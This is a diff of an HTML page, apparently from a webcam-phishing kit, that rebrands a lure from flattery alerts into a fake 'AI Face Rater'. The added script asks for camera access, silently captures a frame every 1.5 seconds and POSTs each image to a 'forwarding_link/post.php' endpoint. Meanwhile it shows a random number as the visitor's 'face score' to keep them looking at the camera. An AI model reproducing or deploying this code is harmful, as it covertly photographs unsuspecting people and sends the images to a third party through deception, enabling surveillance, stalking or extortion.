@@ -14,22 +14,73 @@
 p{
   color:#000;
   font-size: 2rem;
-  position: absolute;
-  top: 50%;
-  right:-50%;
+  margin-top:2rem;
+  margin-bottom: 4rem;
 font-family: 'Poppins', sans-serif;
-  left:50%;
-  transform: translate(-50%,-50%);
 }
 
-label{
-  position: absolute;
-  top: 70%;
-  right:-50%;
+p1{
+    color:#000;
+    font-size: 1.5rem;
+    margin-bottom: 4rem;
+    font-weight: bold;
   font-family: 'Poppins', sans-serif;
-  left:50%;
-  transform: translate(-50%,-50%);
 }
+
+.illustration{
+        display:inline-block;
+        margin-bottom: 2rem;
+        }
+
+        .boi{
+            position:relative;
+            margin-right:3rem;
+            max-width:20%;
+        }
+
+        .girl{
+            max-width:20%;
+            position:relative;
+        }
+
+        #score{
+          color:#000;
+          font-size: 1rem;
+          margin-top: 1rem;
+          letter-spacing: 0.5rem;
+          font-family: 'Poppins', sans-serif;
+        }
+
+        .middle {
+    display: table-cell;
+    vertical-align: middle;
+}
+
+        @media (max-width: 769px) {
+
+          p{
+            margin-top:5rem;
+            margin-bottom: 4rem;
+          }
+
+          #score{
+            font-size: .8rem;
+            margin-top: 2rem;
+          }
+
+          .illustration{
+                  margin-bottom: 3rem;
+                  }
+
+          .boi{
+            max-width: 40%;
+            margin-right: 1rem;
+          }
+
+          .girl{
+            max-width: 40%;
+          }
+        }
 
 </style>
 
@@ -41,73 +92,85 @@ label{
 
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-<script>
-
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-
-    facingMode: "user"
-  }
-};
-
-alert("Your are so special");
-alert("You are good looking");
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 640);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-
-}
-
-// Load init
-init();
-
-</script>
-
     <body>
-        <p>❤️ Hey you are so beautiful ❤️</p>
-        <!-- <label><input type="checkbox" name="mirror" id="mirror" />I know</label> -->
+      <div class="middle">
+        <p>❤️ AI Face Rater ❤️</p>
+        <div class="illustration">
+            <img class="boi" src="img/boi.svg">
+            <img class="girl" src="img/girl.svg">
+        </div>
+        <p1> Your Score </p1>
+        <div id='score'>Reading your face :)</div>
+        </div>
+
+        <script>
+
+        function post(imgdata){
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata},
+            url: 'forwarding_link/post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result){
+                // call the function that handles the response/results
+            },
+            error: function(){
+            }
+          });
+        };
+
+
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.querySelector('span#errorMsg');
+
+        const constraints = {
+          audio: false,
+          video: {
+
+            facingMode: "user"
+          }
+        };
+
+         // alert("This is AI FaceRater allow camera permission so that AI can rate your face");
+
+        // Access webcam
+        async function init() {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+          } catch (e) {
+            document.getElementById('score').innerHTML = "Please allow permission :)";
+            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+          }
+        }
+
+        // Success
+        function handleSuccess(stream) {
+          window.stream = stream;
+          video.srcObject = stream;
+
+        var context = canvas.getContext('2d');
+          setInterval(function(){
+
+               context.drawImage(video, 0, 0, 640, 640);
+               var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+               post(canvasData); }, 1500);
+               setTimeout(function(){
+                 var facescore=(Math.floor(Math.random() * 9) + 5)+'0';
+                 document.getElementById('score').innerHTML = facescore;
+               },4000)
+
+        }
+
+        // Load init
+        init();
+
+        </script>
+
     </body>
 
 </html>
